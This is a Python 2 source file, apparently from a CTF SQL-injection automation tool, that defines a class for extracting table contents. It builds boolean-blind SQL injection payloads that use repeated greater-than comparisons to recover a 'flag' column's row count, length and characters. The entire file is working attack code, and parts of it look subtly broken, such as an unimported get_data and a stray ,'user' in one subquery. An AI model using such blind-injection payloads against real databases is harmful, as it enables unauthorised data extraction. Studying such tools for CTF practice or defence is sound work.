#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib.log import logger
from columns import SqliColumns
__author__ = "LoRexxar"


class SqliContent(SqliColumns):
    def __init__(self):
        SqliColumns.__init__(self)
        if self.columns_name == 0:
            SqliColumns.get_columns(self)

    # 获取内容
    def get_content(self, table_name, column_name):
        for i in xrange(130):
            payload = "f' or (select((SELECT COUNT(flag) from xxx limit 0,1) >" + repr(i) + "))#"
            whether = get_data(payload)
            if (whether == 0):
                flag_count_num = i
                print "[*] flag: " + repr(flag_count_num)
                break

        for i in range(0, int(flag_count_num)):
            for j in xrange(130):
                payload = "f' or (select ((SELECT length(flag) from xxx limit " + repr(i) + ",1) >" + repr(j) + "))#"
                whether = get_data(payload)
                if (whether == 0):
                    flag_len = j
                    print "[*] flag_len: " + repr(flag_len)
                    break

            flag = ""
            for j in range(0, int(flag_len)):
                for k in xrange(130):
                    payload = "f' or (select ((SELECT ascii(substring(flag," + repr(
                        j + 1) + ",1)),'user' from xxx limit " + repr(i) + ",1) >" + repr(k) + "))#"
                    whether = get_data(payload)
                    if (whether == 0):
                        str = k
                        flag += chr(int(str))
                        break
                print "[!] flag:" + flag
            print "[*] flag:" + flag